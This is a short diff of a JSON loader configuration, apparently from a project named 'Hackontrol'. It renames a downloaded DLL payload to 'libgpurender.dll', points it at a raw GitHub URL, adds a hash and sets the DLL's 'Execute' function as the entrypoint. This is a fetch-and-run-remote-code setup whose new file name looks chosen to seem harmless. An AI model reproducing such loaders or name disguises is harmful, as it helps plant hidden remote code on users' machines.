@@ -5,14 +5,14 @@
 	},
 
 	"files": {
-			"file": "ctrl32.dll",
-			"url": "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/system/ctrl32.dll",
-			"sha512": ""
+			"file": "libgpurender.dll",
+			"url": "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/system/libgpurender.dll",
+			"sha256": "1f77795546a8e19e13cf735245bfb87f02ada823ac7abd750c1188a8ed1e4ab8"
 	},
 
 	"entrypoint": {
 		"format": "dll",
-		"file": "ctrl32.dll",
+		"file": "libgpurender.dll",
 		"function": "Execute"
 	}
 }
